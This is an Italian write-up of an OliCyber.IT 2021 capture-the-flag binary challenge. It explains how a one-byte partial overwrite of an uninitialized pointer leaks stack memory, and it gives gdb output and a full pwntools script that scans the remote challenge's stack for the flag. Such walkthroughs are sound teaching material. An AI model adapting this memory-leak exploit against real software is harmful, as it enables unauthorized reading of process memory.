# OliCyber.IT 2021 - Competizione nazionale

## [binary-3] I predatori dell'indirizzo perduto 1 (14 risoluzioni)

In questa challenge ci viene fornito il binario `predatori`, insieme al codice sorgente `predatori.c`.  
Questo binario è lo stesso per `I predatori dell'indirizzo perduto 1` e `I predatori dell'indirizzo perduto 2`.

### Soluzione

Leggendo il codice sorgente possiamo notare che la flag viene letta nel `main` dentro a `char flag1_buffer[FLAG_SIZE];`.

Una volta eseguito il programma ci viene fornito un menù con due opzioni:

```
$ ./predatori
Benvenuto ai Predatori dell'indirizzo perduto 1.0. Anche se puoi leggere e scrivere dovunque, non otterrai mai /bin/sh
Sto caricando importanti informazioni, mostrerò poi il menù.
1) LeggiCosaDove
2) ScriviCosaDove
3) Esci
```

La prima opzione, `LeggiCosaDove`, ci permette di leggere 8 bytes da un indirizzo arbitrario in memoria.

La seconda opzione, `ScriviCosaDove`, ci permette di scrivere 8 bytes ad un indirizzo arbitrario in memoria.

Nella funziona `rww` la variabile `void *addr` non è inizializzata correttamente, utilizzando gdb possiamo notare che a runtime conterrà un puntatore allo stack.

<pre><code>► 0x7ffff7f368b6 &lt;rww+63&gt; call read &lt;read&gt;
    fd: 0x0 (/dev/pts/0)
    buf: 0x7fffffffdce0 —▸ <span style="color:red">0x7fffffffdd30</span> —▸ ...
    nbytes: 0x8</code>
</pre>

Passando pochi bytes (1) alla `read` dentro alla funzione `rww` possiamo ottenere una read dallo stack leakando così la flag.

Per esempio passando una singola `'A'`:

<pre><code>&lt;pwndbg&gt; x/gx 0x7fffffffdce0
0x7fffffffdce0:	0x00007fffffffdd<span style="color:red">41</span></code>
</pre>

A questo punto possiamo scriptare una soluzione che grazie a questo partial overwrite ci permette di cercare la flag sullo stack.

### Exploit

```py
#!/usr/bin/env python
from pwn import ELF, context, args, gdb, remote, process, log, \
    p64, u64, ui, ROP


filename = "predatori"
remotehost = ("predatori.challs.olicyber.it", 15006)


def start(argv=[], *a, **kw):
    return remote(*remotehost, *a, **kw)

def menu(choice: int):
    io.sendlineafter(b"3) Esci", f"{choice}".encode())

def read(where):
    menu(1)
    io.sendafter(b"Indirizzo:", where)
    io.recvuntil(b"richiesta.")
    io.recvline()
    return io.recvline().replace(b"1) LeggiCosaDove\n", b"")

def flag1():
    flag1 = b""
    flag_started = False
    flag_start_offset = -1
    for i in range(0, 255, 8):
        leaked_bytes = read(bytes([i]))
        log.debug(f"leaked addr: {leaked_bytes}")
        if b"flag{" in leaked_bytes:
            flag_started = True
            flag_start_offset = i
        if flag_started:
            flag1 += leaked_bytes
        if b"\x00" in leaked_bytes:
            flag_started = False
    flag1 = flag1.replace(b"\x00", b"").strip().decode()
    if flag_start_offset == -1:
        log.error("Flag1 not found")
    else:
        log.success(f"First flag: {flag1}")

if __name__ == "__main__":
    io = start()
    menu(0)
    io.sendlineafter(b"Jones", b"aaaaa")
    stack = flag1()
    io.close()
```
